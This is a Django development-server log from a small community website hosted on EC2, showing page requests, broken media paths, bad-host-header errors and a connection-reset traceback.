/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[09/Dec/2018 16:35:27] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:35:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[09/Dec/2018 16:35:30] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:35:33] "GET /profile/3 HTTP/1.1" 200 22355
[09/Dec/2018 16:35:41] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:35:41] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:35:43] "GET /community/4/ HTTP/1.1" 200 10341
Not Found: /community/4/logo.jpeg
[09/Dec/2018 16:35:44] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[09/Dec/2018 16:35:53] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:35:54] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:35:58] "GET /?data=Alumni&_=1544373289442 HTTP/1.1" 200 211
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[09/Dec/2018 16:35:58] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 1937
[09/Dec/2018 16:37:02] "GET /profile/3 HTTP/1.1" 200 22355
[09/Dec/2018 16:37:05] "GET /community/3/ HTTP/1.1" 200 10463
[09/Dec/2018 16:37:07] "GET /community/3/ HTTP/1.1" 200 10463
[09/Dec/2018 16:37:31] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:37:31] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:37:48] "GET /community/4/ HTTP/1.1" 200 10341
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[09/Dec/2018 16:41:11] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[09/Dec/2018 16:41:11] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[09/Dec/2018 16:42:44] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[09/Dec/2018 16:42:44] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[09/Dec/2018 16:45:39] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[09/Dec/2018 16:45:39] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[09/Dec/2018 16:51:30] "GET /community/4/ HTTP/1.1" 200 10341
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[09/Dec/2018 16:54:56] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[09/Dec/2018 16:54:57] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media//media/https:/imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[09/Dec/2018 16:55:00] "GET /media//media/https%3A/imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2072
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg
[09/Dec/2018 16:55:00] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 404 1937
Not Found: /media//media/media/ACDC-Wallpaper-For-Desktop.jpg
[09/Dec/2018 16:55:00] "GET /media//media/media/ACDC-Wallpaper-For-Desktop.jpg HTTP/1.1" 404 1892
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg
[09/Dec/2018 16:55:00] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 404 1937
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg
[09/Dec/2018 16:55:00] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg HTTP/1.1" 404 1937
[09/Dec/2018 16:55:00] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 404 1937
Not Found: /media//media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png
[09/Dec/2018 16:55:01] "GET /media//media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 404 1922
Not Found: /media//media/media/brasspanchmukhinaag-500x500.png
[09/Dec/2018 16:55:01] "GET /media//media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 404 1895
[09/Dec/2018 16:55:04] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:55:04] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:55:08] "GET /?data=Alumni&_=1544374440162 HTTP/1.1" 200 211
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[09/Dec/2018 16:55:09] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 1937
Not Found: /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/
[09/Dec/2018 16:56:21] "GET /media//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/ HTTP/1.1" 404 1939
Not Found: /media/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/
[09/Dec/2018 16:56:24] "GET /media/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/ HTTP/1.1" 404 1937
Not Found: /media/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/
[09/Dec/2018 16:56:28] "GET /media/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/ HTTP/1.1" 404 1937
[09/Dec/2018 16:56:35] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg/ HTTP/1.1" 200 102923
[09/Dec/2018 16:57:32] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:57:34] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:57:35] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:57:36] "GET /community/4/ HTTP/1.1" 200 10341
[09/Dec/2018 16:57:48] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 16:57:48] "GET / HTTP/1.1" 200 13669
[09/Dec/2018 16:59:18] "GET / HTTP/1.1" 200 13663
[09/Dec/2018 16:59:22] "GET /?data=Alumni&_=1544374694135 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[09/Dec/2018 16:59:23] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 18:58:06] "GET / HTTP/1.1" 400 62412
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 19:29:33] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 19:55:44] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 20:29:23] "GET / HTTP/1.0" 400 62399
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 20:43:09] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 20:43:12] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 20:46:10] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 20:53:50] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 21:09:20] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 21:48:43] "GET / HTTP/1.1" 400 62414
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 22:15:00] "GET / HTTP/1.1" 400 62455
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 23:00:21] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 23:00:24] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 23:00:32] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 23:31:35] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 23:55:46] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 00:19:14] "GET / HTTP/1.0" 400 62418
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[10/Dec/2018 00:19:14] "GET / HTTP/1.0" 500 59
----------------------------------------
Exception happened during processing of request from ('82.80.160.154', 44790)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 00:49:29] "GET / HTTP/1.1" 400 62654
[10/Dec/2018 01:17:34] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:17:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:17:36] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:17:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[10/Dec/2018 01:17:36] "GET /logo.jpeg HTTP/1.1" 404 5958
[10/Dec/2018 01:17:39] "GET /requests HTTP/1.1" 200 5536
[10/Dec/2018 01:17:41] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:17:43] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:17:44] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:17:45] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:17:45] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:17:50] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 01:17:50] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:17:50] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /community/4/logo.jpeg
[10/Dec/2018 01:17:51] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 01:17:54] "GET /creategroup/ HTTP/1.1" 200 8119
[10/Dec/2018 01:17:55] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /creategroup/logo.jpeg
[10/Dec/2018 01:17:55] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 01:17:59] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:17:59] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:18:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:00] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:18:09] "GET /?data=Alumni&_=1544404679735 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[10/Dec/2018 01:18:10] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[10/Dec/2018 01:18:11] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:18:12] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:18:12] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:14] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:18:15] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:18:16] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:16] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:18:20] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 01:18:21] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:21] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:18:27] "GET /community/4/join HTTP/1.1" 200 6403
[10/Dec/2018 01:18:27] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:46] "POST /community/4/join HTTP/1.1" 200 4834
[10/Dec/2018 01:18:47] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:52] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:18:52] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:18:53] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:18:53] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:18:59] "GET /profile/4 HTTP/1.1" 200 22463
[10/Dec/2018 01:19:00] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /profile/logo.jpeg
[10/Dec/2018 01:19:01] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[10/Dec/2018 01:19:12] "GET /profile/4/mycommunities HTTP/1.1" 200 5675
[10/Dec/2018 01:19:13] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /profile/4/logo.jpeg
[10/Dec/2018 01:19:14] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5988
[10/Dec/2018 01:19:15] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5131
[10/Dec/2018 01:19:15] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:17] "GET /profile/4/mycommunities HTTP/1.1" 200 5675
[10/Dec/2018 01:19:18] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:19] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:19:19] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:19:21] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:19:21] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:27] "GET /profile/4 HTTP/1.1" 200 22463
[10/Dec/2018 01:19:28] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:30] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:19:31] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:19:31] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:19:31] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:39] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:19:40] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:19:41] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:19:41] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:19:43] "GET /profile/4 HTTP/1.1" 200 22463
[10/Dec/2018 01:19:44] "GET /creategroup/ HTTP/1.1" 200 8119
[10/Dec/2018 01:19:45] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:20:04] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 01:20:05] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 01:20:06] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 01:20:06] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:20:13] "GET /community/3/ HTTP/1.1" 200 10463
[10/Dec/2018 01:20:14] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 01:20:14] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /community/3/logo.jpeg
[10/Dec/2018 01:20:14] "GET /community/3/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 01:20:16] "GET /profile/3 HTTP/1.1" 200 17601
[10/Dec/2018 01:20:17] "GET /media/media/logo.png HTTP/1.1" 304 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 01:22:49] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 01:32:46] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 02:08:17] "GET / HTTP/1.1" 400 62407
[10/Dec/2018 02:14:47] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 02:14:50] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 02:14:50] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[10/Dec/2018 02:14:58] "GET /logo.jpeg HTTP/1.1" 404 5958
[10/Dec/2018 02:15:26] "GET / HTTP/1.1" 200 12874
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 02:16:11] "GET / HTTP/1.0" 400 62418
[10/Dec/2018 02:29:24] "GET / HTTP/1.1" 200 12874
[10/Dec/2018 02:29:24] "GET /media/media/logo.png HTTP/1.1" 200 11255
[10/Dec/2018 02:29:24] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[10/Dec/2018 02:29:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[10/Dec/2018 02:29:25] "GET /logo.jpeg HTTP/1.1" 404 5958
[10/Dec/2018 02:29:39] "GET /community/4 HTTP/1.1" 301 0
[10/Dec/2018 02:29:39] "GET /community/4/ HTTP/1.1" 200 9587
Not Found: /community/4/logo.jpeg
[10/Dec/2018 02:29:39] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 02:29:51] "GET /profile/5 HTTP/1.1" 302 0
[10/Dec/2018 02:29:51] "GET /accounts/login/?next=/profile/5 HTTP/1.1" 200 2576
[10/Dec/2018 02:29:51] "GET /media/media/logo.jpeg HTTP/1.1" 200 12167
Not Found: /accounts/login/logo.jpeg
[10/Dec/2018 02:29:51] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6003
Not Found: /accounts/media/media/favicon.ico
[10/Dec/2018 02:29:52] "GET /accounts/media/media/favicon.ico HTTP/1.1" 404 6027
[10/Dec/2018 02:30:02] "GET /community/4/ HTTP/1.1" 200 9587
[10/Dec/2018 02:30:05] "GET /community/3 HTTP/1.1" 301 0
[10/Dec/2018 02:30:05] "GET /community/3/ HTTP/1.1" 200 10028
Not Found: /community/3/logo.jpeg
[10/Dec/2018 02:30:05] "GET /community/3/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 02:30:15] "GET /profile/3 HTTP/1.1" 302 0
[10/Dec/2018 02:30:15] "GET /accounts/login/?next=/profile/3 HTTP/1.1" 200 2576
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 03:20:05] "GET / HTTP/1.1" 400 62404
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 04:19:55] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 04:30:55] "GET / HTTP/1.0" 400 62418
[10/Dec/2018 04:43:55] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 04:43:55] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 04:43:55] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 04:43:55] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[10/Dec/2018 04:43:56] "GET /logo.jpeg HTTP/1.1" 404 5958
[10/Dec/2018 04:43:59] "GET /community/4/ HTTP/1.1" 200 10341
[10/Dec/2018 04:44:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 04:44:00] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 04:44:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /community/4/logo.jpeg
[10/Dec/2018 04:44:00] "GET /community/4/logo.jpeg HTTP/1.1" 404 5994
[10/Dec/2018 04:44:02] "GET /profile/5 HTTP/1.1" 200 17586
[10/Dec/2018 04:44:02] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /profile/logo.jpeg
[10/Dec/2018 04:44:03] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[10/Dec/2018 04:44:06] "GET /profile/5 HTTP/1.1" 200 17586
[10/Dec/2018 04:44:07] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 04:44:15] "GET /login/ HTTP/1.1" 302 0
[10/Dec/2018 04:44:16] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 04:44:16] "GET /media/media/logo.png HTTP/1.1" 304 0
[10/Dec/2018 04:44:16] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[10/Dec/2018 04:44:16] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[10/Dec/2018 05:08:18] "GET /logo.jpeg HTTP/1.1" 404 5958
Not Found: /togther
[10/Dec/2018 05:53:05] "GET /togther HTTP/1.1" 404 5952
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 06:42:37] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 07:02:13] "GET / HTTP/1.1" 400 62406
[10/Dec/2018 07:13:58] "GET / HTTP/1.1" 200 13663
[10/Dec/2018 07:14:02] "GET /media/media/logo.png HTTP/1.1" 200 11255
